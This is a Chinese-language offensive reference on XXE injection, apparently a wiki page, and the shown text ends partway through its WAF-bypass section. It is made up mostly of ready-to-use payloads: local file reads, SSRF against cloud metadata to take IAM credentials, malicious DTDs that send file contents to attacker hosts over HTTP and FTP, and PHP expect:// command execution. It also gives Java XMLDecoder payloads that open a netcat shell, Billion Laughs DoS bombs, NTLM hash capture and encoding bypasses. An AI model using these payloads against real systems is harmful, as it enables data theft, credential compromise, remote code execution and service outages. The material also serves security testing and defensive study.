---
attack_surface:
  - 注入类
  - 信息泄露
  - 协议解析差异
  - 编码/序列化滥用
impact:
  - 机密性破坏
  - 远程代码执行
  - 信息泄露
  - 权限提升
  - 可用性破坏
  - 身份伪造
risk_level: 严重
prerequisites:
  - XML/DTD 基础语法与实体机制
  - HTTP 协议与 Content-Type 机制
  - Burp Suite / Collaborator 基础操作
related_techniques:
  - ssrf
  - xslt-server-side-injection
  - deserialization
  - file-upload
  - content-type-confusion
  - xpath-injection
difficulty: 中级
tools:
  - Burp Suite (Repeater / Intruder / Collaborator)
  - xxeftp (XXE FTP 外带服务器)
  - XXEInjector (Ruby 盲 XXE 自动化)
  - xxexploiter (Node.js XXE 扫描器)
  - dtd-finder (Java DTD 路径扫描)
---

# XXE (XML External Entity) — XML 外部实体注入全矩阵
> 关联文档：[JSON XML YAML Hacking](../JSON%20XML%20YAML%20Hacking/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md) · [XSLT Server Side Injection](../../../Proxies/XSLT%20Server%20Side%20Injection/README.md) · [File Upload](../../../Files/File%20Upload/README.md) · [Deserialization](../../Deserialization/README.md)

---

# 0x01 原理与分类

## 1.0 TL;DR

XXE（XML External Entity）是 OWASP Top 10 中最为致命的 XML 解析器攻击之一。当应用程序接受用户可控的 XML 数据并使用**默认配置**的 XML 解析器处理时，攻击者通过在 Document Type Definition（DTD）中声明外部实体，可以实现：

- **文件读取**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` → 响应中直接回显文件内容
- **SSRF 内网探测**：`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` → 云环境元数据窃取
- **盲外带数据**：通过参数实体 + 外部 DTD 将文件内容通过 HTTP/FTP 外带到攻击者服务器
- **DoS**：Billion Laughs 攻击使解析器耗费 3GB+ 内存导致 OOM
- **RCE**：在 PHP（expect 模块）或 Java（XMLDecoder）环境下直达命令执行

核心攻击链：`用户输入 → XML 解析器（未禁用外部实体）→ DTD 实体声明 → 文件系统/网络访问 → 信息泄露/RCE/DoS`

## 1.1 根本原理

XML 规范在设计之初就包含了一个强大而危险的功能：**Document Type Definition (DTD) 中的外部实体引用**。DTD 定义了 XML 文档的结构规则，其中实体（Entity）机制允许将一段内容赋值给一个变量名，并在文档体中通过 `&entityName;` 引用。当实体引用指向外部资源（文件路径或 URL）时，XML 解析器默认会**自动获取并展开**该外部资源的内容。

问题的根源在于：**绝大多数 XML 解析器的默认配置启用了外部实体解析**。这不是"漏洞"，这是 XML 1.0 规范的设计特性。因为早期 XML 的主要用途是文档交换（如 DocBook、XHTML），在这些场景中透明地引用外部资源是合理需求。但当同样的解析器用于处理不可信用户输入时，这一特性就变成了严重的安全漏洞。

关键点：
- XML 解析器**不知道**它正在处理的 XML 来自不可信源——它一视同仁地解析 `<root>&xxe;</root>`，无论这个 XML 是由内部微服务生成还是由外部攻击者提交
- 外部实体解析发生在**解析阶段**而非业务逻辑阶段——即使应用代码从不访问实体值，解析器也会在解析期间发起文件读取或网络请求
- 参数实体（`%param;`）使攻击者可以在 DTD 内部构造嵌套引用，极大扩展了攻击面

## 1.2 XML 解析架构与攻击面

```
[XML Input] → XML Parser
                  ├── DTD 解析器 ← ★ 实体声明、外部引用（核心攻击面）
                  ├── Schema 验证器 (XSD/DTD 验证)
                  └── 内容处理器 (SAX/DOM/StAX)
```

解析模式与安全影响：

| 解析模式 | 外部实体 | DTD 处理 | 典型攻击 |
|----------|---------|---------|---------|
| DOM（文档对象模型） | **默认启用** | **默认启用** | XXE 文件读取 / SSRF |
| SAX（事件驱动） | 可配置 | 可配置 | XXE（部分实现仍默认启用） |
| StAX（拉式解析） | 默认禁用 | 默认禁用 | 较安全，但 XInclude 可能开启 |

## 1.3 DTD 与实体机制速查

### 1.3.1 实体类型

```xml
<!-- 内部实体：在 DTD 内部定义具体值 -->
<!DOCTYPE foo [
  <!ENTITY myentity "value">
]>
<root>&myentity;</root>  <!-- → <root>value</root> -->

<!-- 外部实体：值来自外部资源（文件/URL） -->
<!DOCTYPE foo [
  <!ENTITY ext SYSTEM "file:///etc/passwd">
]>
<root>&ext;</root>  <!-- → <root>root:x:0:0:root:/root:/bin/bash\n...</root> -->

<!-- 参数实体：仅在 DTD 内部可用，使用 % 前缀 -->
<!DOCTYPE foo [
  <!ENTITY % param "<!ENTITY internal 'value'>">
  %param;  <!-- 展开后声明了 internal 实体 -->
]>
```

### 1.3.2 内部 DTD vs 外部 DTD

| 特性 | 内部 DTD | 外部 DTD |
|------|---------|---------|
| 定义位置 | XML 文档内部 `<!DOCTYPE [...]>` | 独立文件，通过 URL 引用 |
| 实体嵌套 | 参数实体**不能**在内部 DTD 中嵌套引用另一个参数实体的声明 | 参数实体可以嵌套 |
| 攻击场景 | 简单文件读取 / SSRF | 盲 XXE 数据外带 / Error-Based 外带 |

**关键限制**：`<!ENTITY % eval "<!ENTITY % error SYSTEM '...'>">` 这种**在参数实体内部再声明参数实体**的写法，在内部 DTD 中是被 XML 规范禁止的，因此盲 XXE 数据外带必须依赖外部 DTD。

## 1.4 攻击面归属与风险矩阵

| 攻击面分类 | 具体技术 | 风险等级 |
|-----------|---------|---------|
| **注入类** | XML 外部实体注入（文件读取/SSRF） | **严重** |
| **信息泄露** | 文件内容外带、目录列举、错误消息泄露 | **严重** |
| **编码/序列化滥用** | Java XMLDecoder RCE、PHP expect:// RCE | **严重** |
| **协议解析差异** | DTD 解析器默认行为差异、参数实体处理差异 | 高 |
| **可用性破坏** | Billion Laughs / Quadratic Blowup | 中 |

---

# 0x02 检测与入口点识别

## 2.1 基本实体声明检测

最简 XXE 探测：声明一个内部实体并观察其是否被展开。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```

如果响应中 `&toreplace;` 被替换为 `3`，说明解析器启用了实体处理 → XXE 可能可用。

## 2.2 Content-Type 切换检测

许多应用默认接受 JSON 格式，但后端框架可能同时支持 XML。尝试切换 `Content-Type` 可能打开 XXE 攻击面：

```http
# 原始请求 (JSON)
POST /api/process HTTP/1.1
Content-Type: application/json

{"productId": 1, "storeId": 2}

# 尝试切换为 XML
POST /api/process HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><root>test</root>
```

**关键观察**：
- 如果切换后请求被正常处理 → 后端接受 XML 输入
- 如果返回 XML 解析错误 → 确认有 XML 解析器在处理输入
- 响应中是否回显了 XML 中的任意值？→ 决定是带内还是盲 XXE

## 2.3 隐蔽 XXE 表面扫描清单

并非所有 XXE 入口都是明显的 POST body。需要检查的隐蔽表面：

- [ ] **文件上传**：SVG、DOCX/XLSX、PDF、XLIFF 文件是否被服务端解析？
- [ ] **RSS/Atom Feed**：应用是否解析用户提交的 RSS URL？
- [ ] **SOAP API**：后端是否使用 SOAP 通信？Content-Type: `application/soap+xml`
- [ ] **SAML 断言**：SSO 流程中是否处理 XML 断言？
- [ ] **Office 文档导入**：是否支持导入 XLSX/DOCX？（底层是 ZIP 包含 XML）
- [ ] **XLIFF 本地化文件**：翻译平台是否接受 XLIFF 格式？
- [ ] **Print/JMF 服务**：打印编排平台是否暴露 JMF 监听端口？
- [ ] **`Content-Type` 为 `application/x-www-form-urlencoded` 的端点**：尝试切换为 `text/xml`
- [ ] **`Content-Type: application/json` 的端点**：尝试切换为 `application/xml`

---

# 0x03 带内 XXE — 文件读取与 SSRF

带内（In-Band）XXE 是指攻击结果直接出现在 HTTP 响应体中，是最简单、最直接的利用形式。

## 3.1 基本文件读取

### 3.1.1 标准 SYSTEM 实体

```xml
<!-- 基础 Payload -->
<?xml version="1.0" ?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

Linux 目标文件：
- `/etc/passwd` — 用户列表
- `/etc/hostname` — 主机名
- `/etc/issue` — OS 版本信息
- `/proc/self/environ` — 环境变量（可能含凭据）
- `/proc/self/cmdline` — 启动命令
- `~/.ssh/id_rsa` — SSH 私钥
- `/var/www/html/config.php` — Web 应用配置

Windows 目标文件：
- `C:\windows\system32\drivers\etc\hosts`
- `C:\windows\win.ini`
- `C:\inetpub\wwwroot\web.config`

### 3.1.2 `file://` 协议显式声明

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck>
```

`<!ELEMENT stockCheck ANY>` 声明元素可以包含任意内容，有时当目标应用对 XML 结构有 Schema 验证时，此声明可以绕过结构检查。

### 3.1.3 PHP Wrapper 增强读取

当后端为 PHP 时，`php://filter` 可用于 Base64 编码读取文件（避免特殊字符破坏 XML 结构）：

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

PHP Wrapper 读取源码：

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<root>&xxe;</root>
```

读取外部 URL 资源：

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```

### 3.1.4 Java 目录列举

在 Java 应用中，如果文件读取指向目录而非文件，可能返回目录列表：

```xml
<!-- 列出根目录 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aa [<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///"><root><foo>&xxe;</foo></root>

<!-- 列出 /etc/ 目录 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

## 3.2 SSRF 与内网探测

XXE 可以直接发起 HTTP 请求，使其成为一种强大的 SSRF 载体。

### 3.2.1 基本 SSRF Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### 3.2.2 云环境元数据端点

| 云平台 | 元数据 URL | 目标信息 |
|--------|-----------|---------|
| AWS EC2 | `http://169.254.169.254/latest/meta-data/` | IAM 角色凭据、实例信息 |
| AWS ECS | `http://169.254.170.2/v2/credentials/<GUID>` | 任务角色凭据 |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | 托管标识令牌 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | 服务账号令牌（需 `Metadata-Flavor: Google` 头，XXE 无法设置自定义头） |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | API 令牌 |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | RAM 角色凭据 |

**AWS 凭据窃取完整路径**：

```
http://169.254.169.254/latest/meta-data/                          → 列出可用端点
http://169.254.169.254/latest/meta-data/iam/security-credentials/  → 列出角色名
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin → 获取 AccessKey/SecretKey/Token
```

## 3.3 XInclude 攻击

当攻击者只能控制 XML 文档中的一部分数据（如 SOAP 请求中的某个参数值），无法修改 `DOCTYPE` 元素时，`XInclude` 提供了替代方案：

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

触发条件：
- 解析器启用了 XInclude 处理（`setXIncludeAware(true)`，在某些 Java 实现中默认开启）
- 攻击者控制的数据被直接拼接到服务端生成的 XML 文档中

---

# 0x04 盲 XXE — 带外数据外带 (Out-of-Band)

当 XXE 漏洞存在但响应不包含实体展开结果时，需要通过带外通道（Out-of-Band, OOB）确认漏洞并外带数据。

## 4.1 参数实体带外检测

最简单的盲 XXE 检测——让服务器通过 DNS/HTTP 回连你的 Collaborator：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

如果收到 Collaborator 回调 → 确认 XXE。

## 4.2 外部 DTD 外带文件内容

这是盲 XXE 最核心的利用技术。由于内部 DTD 禁止参数实体嵌套声明，攻击者需要：

1. 在自己的服务器上托管一个恶意 DTD 文件
2. 在 XXE Payload 中引用该外部 DTD
3. 恶意 DTD 读取目标文件并通过 HTTP 请求将内容外带

### 4.2.1 恶意 DTD 文件 (`evil.dtd`)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**执行流程**：
1. `%file` 读取 `/etc/hostname` 的内容（假设是 `web-server-01`）
2. `%eval` 被展开，动态声明了一个新实体 `%exfiltrate`，其 SYSTEM URL 为 `http://web-attacker.com/?x=web-server-01`
3. `%exfiltrate` 被触发 → HTTP GET 请求 → 数据外带到攻击者服务器

### 4.2.2 XXE Payload（引用外部 DTD）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/evil.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### 4.2.3 多行文件 FTP 外带

HTTP URL 中不能包含换行符，因此多行文件（如 `/etc/passwd`）无法通过 HTTP GET 参数外带。解决方法是使用 FTP 协议：

**恶意 DTD (`evil_ftp.dtd`)**：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%exfiltrate;
```

工具支持：
```bash
# xxeftp — 启动 FTP 外带服务器
python3 xxeftp.py --port 2121

# XXEInjector — 自动化盲 XXE
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/passwd
```

## 4.3 带外通道对比

| 协议 | 优势 | 限制 |
|------|------|------|
| HTTP | 穿透防火墙，Collaborator 一站式 | URL 不能含换行 → 只能外带单行文件 |
| FTP | 支持多行文件外带 | FTP 出站可能被防火墙阻止 |
| DNS | 穿透性最强 | 数据量极小（子域名长度限制），需 DNS 隧道工具 |
| `file://` + 错误消息 | 无需外连（见 0x05） | 需要看到错误消息 |

---

# 0x05 盲 XXE — 基于错误消息的外带 (Error-Based)

当带外连接被防火墙阻止时，错误消息外带是最后也是最优雅的武器——它不需要任何出站连接。

## 5.1 外部 DTD 错误外带

通过构造一个必定失败的 `file://` 请求，将目标文件内容嵌入错误消息的文件名部分：

**恶意 DTD (`error.dtd`)**：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

当解析器尝试加载 `file:///nonexistent/<passwd_contents>` 时，这个文件不存在 → 抛出异常 → 错误消息中包含完整路径 → 泄露文件内容。

错误消息示例：
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 5.2 系统 DTD 错误外带（无外连环境）

这是盲 XXE 的最高阶技术——不仅不需要响应回显，**连出站连接都不需要**。利用服务器上已存在的合法 DTD 文件，通过重新定义其声明的实体来构建错误外带 Payload。

### 5.2.1 原理

XML 规范有一个关键特性：**在内部 DTD 中可以重新定义外部 DTD 中已声明的参数实体**。攻击流程：

1. 找到服务器文件系统上的一个 DTD 文件（如 `/usr/share/yelp/dtd/docbookx.dtd`）
2. 将该 DTD 引入内部 DTD（`%local_dtd;`）
3. **重新定义**该 DTD 中已有的某个参数实体（如 `ISOamso`）
4. 在重定义中嵌入错误外带逻辑

### 5.2.2 GNOME 桌面环境示例

使用 GNOME 系统中普遍存在的 `/usr/share/yelp/dtd/docbookx.dtd`（包含 `ISOamso` 实体）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY % error SYSTEM ''file:///nonexistent/%file;''>">
        %eval;
        %error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### 5.2.3 DTD 发现方法

利用 `dtd-finder` 工具扫描 Docker 镜像：

```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/target_image.tar

# 输出示例:
# [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
# [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
```

手动探测特定 DTD 文件是否存在：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

如果 DTD 文件存在但实体名不存在 → "Entity 'xxx' not defined" 错误；如果 DTD 文件不存在 → "Could not load external DTD" 错误。

**已知可用的系统 DTD 路径**：
- `/usr/share/yelp/dtd/docbookx.dtd` (GNOME, `ISOamso` 实体)
- `/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd`
- `/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd`
- `/usr/share/xml/fontconfig/fonts.dtd`
- GitHub 列表：https://github.com/GoSecure/dtd-finder/tree/master/list

## 5.3 技术选择决策树

```
发现 XXE
├── 响应中是否有回显？
│   ├── 是 → # 0x03 带内文件读取 / SSRF
│   └── 否 → 盲 XXE
│       ├── 是否可以出站连接？
│       │   ├── 是 → # 0x04 带外外带（HTTP/FTP/DNS）
│       │   └── 否 → # 0x05 错误消息外带
│       │       ├── 能否看到错误消息？
│       │       │   ├── 是 → 外部 DTD 错误外带 / 系统 DTD 错误外带
│       │       │   └── 否 → 仅确认漏洞存在（无数据外带可能）
```

---

# 0x06 文件上传 XXE

多种基于 XML 的文件格式在服务端处理时可触发 XXE。

## 6.1 SVG 文件上传

SVG 是 XML 格式的矢量图，可在上传到图片处理服务时触发 XXE：

### 6.1.1 文件读取

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
  <image xlink:href="file:///etc/hostname"></image>
</svg>
```

**注意事项**：
- 文件内容（或第一行）会**渲染在生成的图片中**——必须能访问生成的图片
- 某些图片处理库（如 ImageMagick）处理 SVG 时会调用 XML 解析器

### 6.1.2 PHP expect:// 命令执行

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

### 6.1.3 SVG + XSS 组合

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
  <script>alert(document.domain)</script>
</svg>
```

## 6.2 Office Open XML 文件上传

DOCX/XLSX/PPTX 文件本质上是 ZIP 压缩包，其中包含 XML 文件。当应用上传 Office 文件并解析其中的 XML 时，可触发 XXE。

### 6.2.1 构造恶意 Office 文档

```bash
# 1. 创建空目录
mkdir unzipped && cd unzipped

# 2. 解压一个正常的 docx/xlsx 文件
unzip ../normal.docx

# 3. 编辑 word/document.xml（或 xl/workbook.xml）
# 在根元素之间插入 XXE Payload
vim word/document.xml

# 4. 重新打包
zip -r ../malicious.docx *

# 5. 上传 malicious.docx，监控 Collaborator
```

### 6.2.2 注入位置

在 `word/document.xml` 中，在 XML 声明之后、根元素之前注入 DTD：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://your-collaborator.net/xxe_oob">
]>
<w:document xmlns:w="...">
  &xxe;
  ...
</w:document>
```

## 6.3 PDF 文件上传

某些 PDF 解析库在提取元数据或处理嵌入 XML 时会触发 XXE。具体利用方法取决于 PDF 解析器的实现。

## 6.4 XLIFF 文件上传

XLIFF（XML Localization Interchange File Format）用于翻译交换，是 XML 格式。当翻译管理平台接受 XLIFF 上传时可触发 XXE。

### 6.4.1 盲 XXE 检测

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
```

### 6.4.2 错误外带 DTD

```xml
<!-- 托管在 attacker.com 的 evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```

**Java 1.8 限制**：无法通过 OOB 方式获取包含换行符的文件（如 `/etc/passwd`）。此时必须使用 Error-Based 方式。

---

# 0x07 高级攻击向量

## 7.1 Java jar: 协议

专属于 Java 应用的攻击向量。`jar:` 协议允许从远程 ZIP 归档中读取文件：

```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```

### 7.1.1 jar: XXE Payload

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```

处理流程：
1. 解析器向 `attacker.com:8080` 发起 HTTP 请求下载 `evil.zip`
2. 临时存储到 `/tmp/...`
3. 解压并读取 `evil.dtd`
4. 临时文件被删除

### 7.1.2 利用 jar: 协议驻留临时文件

关键利用技巧：在第二步**无限期保持 HTTP 连接**（不关闭连接、持续发送数据），导致下载的 ZIP 文件驻留在临时目录。配合路径遍历漏洞可触发进一步利用链（LFI、模板注入、XSLT RCE 等）。

工具：`slow_http_server.py` / `slowserver.jar`（来自 [xxe-workshop](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution)）

## 7.2 PHP expect:// 命令执行

当 PHP 加载了 `expect` 扩展模块时，可直接通过 XXE 执行系统命令：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## 7.3 SOAP XXE

SOAP（Simple Object Access Protocol）基于 XML，将 XXE Payload 封装在 CDATA 中绕过 SOAP 结构验证：

```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## 7.4 RSS XXE

RSS/Atom Feed 解析器处理 XML 时可被利用：

### 7.4.1 Ping Back 检测

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### 7.4.2 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
...
<item>
<title>&xxe;</title>
...
</item>
</channel>
</rss>
```

### 7.4.3 PHP Base64 源码读取

```xml
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" ...>
...
<title>&xxe;</title>
...
</rss>
```

## 7.5 JMF 打印服务 XXE → SSRF

打印工作流/编排平台（如 Xerox FreeFlow Core）常暴露基于 Java 的 JMF（Job Messaging Format）监听端口，接受 XML 格式消息。

### 7.5.1 最小化 SSRF 探针

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE JMF [
  <!ENTITY probe SYSTEM "http://attacker-collab.example/oob">  
]>
<JMF SenderID="hacktricks" Version="1.3" TimeStamp="2025-08-13T10:10:10Z">
  <Query Type="KnownMessages">&probe;</Query>
</JMF>
```

**实战要点**：
- JMF 默认端口：4004（Xerox FreeFlow Core）
- Java XML 解析一般在 `jmfclient.jar` 中，默认未禁用外部实体
- SSRF 可链接到 localhost 管理 API 做内网横向移动
- **关联 CVE**：CVE-2025-8355（XXE 注入）、CVE-2025-8356（路径遍历）— 两者可串联实现未认证 RCE。已在 FreeFlow Core v8.0.5 修复（Xerox Security Bulletin 025-013）

---

# 0x08 Java XMLDecoder — XXE to RCE

`XMLDecoder` 是 Java 中一个特殊类，它不仅仅解析 XML——它会**从 XML 中反序列化并执行 Java 对象**。如果能控制 `readObject()` 的输入，则可直接获得代码执行。

## 8.1 利用 Runtime.exec()

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

## 8.2 利用 ProcessBuilder（更灵活）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

**关键区分**：`XMLDecoder` 不是传统意义上的 XXE——它是 Java Beans 反序列化。但它使用 XML 作为序列化格式，因此任何接受用户 XML 并调用 `XMLDecoder.readObject()` 的应用都可能受影响。

---

# 0x09 XXE DoS 攻击

## 9.1 Billion Laughs（指数级实体展开）

利用嵌套实体引用实现指数级字符串展开：

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

展开过程：`a0` = 3 字节 → `a1` = 30 字节 → `a2` = 300 字节 → `a3` = 3,000 字节 → `a4` = 30,000 字节。继续叠加到 10 层 → 3 × 10^9 ≈ 3 GB。

## 9.2 Quadratic Blowup（二次方展开）

不需嵌套实体，通过大量重复引用实现二次方放大：

```xml
<!DOCTYPE bomb [
  <!ENTITY a "xxxxx...x">  <!-- 50KB 字符串 -->
]>
<bomb>
  <a>&a;</a><a>&a;</a>...  <!-- 重复 50000 次 -->
</bomb>
```

50KB × 50000 = 2.5 GB 输出。更隐蔽——WAF 通常检测嵌套实体但很少检测重复引用。

## 9.3 YAML Anchor Bomb（跨格式 DoS）

YAML 的 Anchor/Alias 机制同样支持指数级展开，可与 XML 解析器级联：

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
# ... 9 层 → ~10^9 引用
```

## 9.4 Windows NTLM 哈希捕获

在 Windows 环境下，通过 `file://` 指向攻击者 IP 可迫使服务器发起 SMB 认证：

```bash
# 启动 Responder 监听
Responder.py -I eth0 -v
```

```xml
<?xml version="1.0" ?>
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```

收到 Net-NTLMv2 哈希后，用 hashcat 离线破解。

---

# 0x0A WAF 与防护绕过

## 10.1 Base64 编码绕过

利用 `data://` 协议将 DTD 声明编码为 Base64：

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

Base64 解码 `ZmlsZTovLy9ldGMvcGFzc3dk` = `file:///etc/passwd`。

**条件**：XML 解析器必须支持 `data://` 协议。

## 10.2 UTF-7 编码绕过

将整个 XML 文档（包括 DTD）用 UTF-7 编码：

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

